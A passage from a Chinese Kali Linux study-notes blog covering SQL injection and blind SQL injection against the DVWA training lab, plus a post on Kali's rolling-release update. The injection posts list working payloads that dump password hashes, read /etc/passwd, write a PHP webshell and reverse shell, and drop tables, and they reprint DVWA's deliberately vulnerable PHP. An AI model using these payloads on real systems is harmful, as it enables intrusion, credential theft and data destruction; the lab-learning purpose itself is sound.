                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  763 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
<li>不显示数据库内建的报错信息<ul>
<li>内建的报错信息帮助开发人员发现和修复问题</li>
<li>报错信息提供关于系统的大量有用信息</li>
</ul>
</li>
<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
<li>1’ and 1=1–+</li>
<li>1’ and 1=2–+</li>
<li>1’ order by 5–+  假</li>
<li>1’ order by 2–+  真</li>
<li>1’ union select 1,2–+</li>
<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
</ul>
</li>
</ul>
<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
<li>无权读取information_shcema库/拒绝union、order by语句<ul>
<li>猜列名：1’ and user is not null–+</li>
<li>猜当前表名：1’ and table.user is not null–+</li>
<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
<li>列表对应关系：1’ and users.user is not null–+</li>
<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
<li>▲ Burpsuite自动化猜解内容</li>
</ul>
</li>
</ul>
<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
<li>开个脑洞<ul>
<li>真实案例：某电商网站</li>
<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
<li>and 1=1–+  显示一包面巾纸</li>
<li>and 1-2–+  显示一袋洗衣粉</li>
<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
<li>CURRENT_USER()、DATABASE()</li>
<li>MID用法：MID(ColumnName,Start [,Length])</li>
<li>ORD用法：ORD(string)   #ASCII码</li>
</ul>
</li>
</ul>
<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
<li>DVWA的SQL Injection(Blind) Source（Low）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的SQL Injection(Blind) Source（High）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" itemprop="url">Kali Linux笔记(四十八)：Kali Linux版本更新--rolling</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:35+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  232 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Kali-Linux版本更新–第一个Rolling-RELEASE"><a href="#1-Kali-Linux版本更新–第一个Rolling-RELEASE" class="headerlink" title="1. Kali Linux版本更新–第一个Rolling RELEASE"></a>1. Kali Linux版本更新–第一个Rolling RELEASE</h4><ul>
<li>Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）</li>
<li>Fixed-release<ul>
<li>固定发布周期</li>
<li>使用软件稳定的主流版本（发布–主流–作废）</li>
<li>更稳定，适合于企业生成环境</li>
</ul>
</li>
<li>Rolling release<ul>
<li>适用于开发者和技术人员</li>
<li>连续升级新版本，追求在新功能出现后最快使用</li>
<li>正式成为流行</li>
</ul>
</li>
<li>Kali 2.0 rolling release<ul>
<li>采用debian testing库作为更新源</li>
</ul>
</li>
<li>软件包追踪<ul>
<li><a href="https://pkg.kali.org/" target="_blank" rel="noopener">https://pkg.kali.org/</a></li>
</ul>
</li>
<li>VMware Tools vs Open-VM-Tools<ul>
<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
</ul>
</li>
<li>Gnome 3.18</li>
<li>4.3内核</li>
<li>Kali 2.0现有版本升级</li>
</ul>
<blockquote>
<pre><code>⭐现有版本更新
cat &lt;&lt; EOF &gt; /etc/apt/sources.list
deb http://http.kali.org/kali kali-rolling main non-free contrib
EOF

⭐安装命令
apt-get update
apt-get dist-upgrade 
reboot

⭐查看版本号，代码号
lsb_release -a</code></pre></blockquote>
<ul>
<li>Kali sana库于2016年4月15日停止更新</li>
<li>工具有所更新</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/" itemprop="url">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
<li>用户登录判断<ul>
<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
</ul>
</li>
<li>基于报错的检测方法（low）<ul>
<li>‘ “ % ()</li>
</ul>
</li>
<li>基于布尔的检测<ul>
<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
</ul>
</li>
<li>表列数/显示信息位于哪一列<ul>
<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
<li>select * 时表字段数=查询字段数</li>
</ul>
</li>
<li>联合查询<ul>
<li>‘union select 1,2–+ </li>
<li>‘union all select database()/user()/version(),2– +</li>
</ul>
</li>
<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
<li>DB用户：user() </li>
<li>DB版本：version()</li>
<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
<li>当前库：database()</li>
<li>ASCII转字符：char()</li>
<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
<li>计算哈希：md5()</li>
<li>Mysql数据结构<ul>
<li>information_schema</li>
</ul>
</li>
<li>所有库所有表/统计每库中表的数量<ul>
<li>‘union select table_name,table_schema from information_schema.tables–+</li>
<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
</ul>
</li>
<li>Dvwa库中的表名<ul>
<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
</ul>
</li>
<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
</ul>
</li>
<li>查询user、password列的内容<ul>
<li>‘union select users,password from dvwa,users–+</li>
<li>‘union select users,password from users–+</li>
<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
</ul>
</li>
</ul>
<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
<li>hash-identifier<ul>
<li>输入猜测的值</li>
</ul>
</li>
<li>密码破解<ul>
<li>username:passhash–&gt;dvwa.txt</li>
<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
</ul>
</li>
<li>显示之前破解的密码<ul>
<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
<li>读取文件<ul>
<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
</ul>
</li>
<li>写入文件（原文件形式）<ul>
<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
<li><ul>
<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
</ul>
</li>
</ul>
</li>
<li>写入文件（十六进制模式）<ul>
<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
<li>可能受到服务器GET大小的限制，传输不成功</li>
</ul>
</li>
<li>保存下载数据库<ul>
<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
</ul>
</li>
<li>一个思路：编写服务器端代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>

<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
<li>无权读取information_schema库/拒绝union、order by语句<ul>
<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
<li>猜当前表表名：’and table.user is null–+</li>
<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
<li>列表对应关系：’and users.user is null–+</li>
<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
⭐查找column字典
find / -name *column*.txt
cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
⭐查找table表名
find / -name *.table*.txt
cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
⭐MD5作为字典
md5sum common-password.txt password.txt</code></pre></blockquote>
<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
<li>注入失败，sql客户端工具的问题</li>
<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
</ul>
</li>
<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
<li>‘;DROP TABLE users;–+</li>
<li>xp_cmdshell /存储过程</li>
<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
</ul>
<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
<li>Dvwa的SQL Injection Source（Low）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的SQL Injection Source（Medium）<ul>
<li>对特殊字符的转义</li>
<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
<li>PHP 5.5.0已经启用此函数</li>
<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span 